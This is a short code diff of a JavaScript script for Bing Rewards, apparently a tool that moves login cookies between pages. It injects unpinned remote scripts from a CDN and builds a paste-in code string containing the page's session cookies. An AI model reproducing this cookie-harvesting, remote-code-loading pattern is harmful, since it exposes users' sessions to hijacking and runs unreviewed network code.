@@ -1,15 +1,15 @@
 if(window.location.href.includes("bing.com")){
     if(window.location.href.includes("rewards.bing")){
         var e1 = document.createElement("script"); 
-        e1.setAttribute("src", "https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@main/Credential.js"); 
+        e1.setAttribute("src", "https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@latest/Credential.js"); 
         document.body.appendChild(e1);
         var e2 = document.createElement("script"); 
-        e2.setAttribute("src", "https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@main/extract.js");
+        e2.setAttribute("src", "https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@latest/extract.js");
         document.body.appendChild(e2);
         injectHtml();
         rewards = document.cookie;
     }else{
-        var codeForRewards = 'document.body.appendChild(Object.assign(document.createElement("script"),{src:"https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@main/web.js"}));setBing("'+document.cookie+'")';
+        var codeForRewards = 'document.body.appendChild(Object.assign(document.createElement("script"),{src:"https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@latest/web.js"}));setBing("'+document.cookie+'")';
         if (window.clipboardData && window.clipboardData.setData) {
             // IE: prevent textarea being shown while dialog is visible
             window.clipboardData.setData("Code for Rewards page", codeForRewards);
